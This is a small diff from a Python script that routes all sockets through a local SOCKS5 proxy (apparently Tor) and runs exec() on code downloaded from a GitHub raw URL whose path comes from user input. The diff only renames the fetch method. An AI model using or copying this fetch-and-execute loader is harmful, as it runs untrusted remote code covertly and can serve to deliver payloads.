@@ -845,7 +845,7 @@ set_default_proxy(SOCKS5,'127.0.0.1',9150)
 socket.socket=socksocket
 
 class safenet:
-    def getbinary(url):
+    def getbin(url):
         return urlopen(Request(url)).read()
       
-exec(safenet.getbinary('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>')))
+exec(safenet.getbin('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('>')))
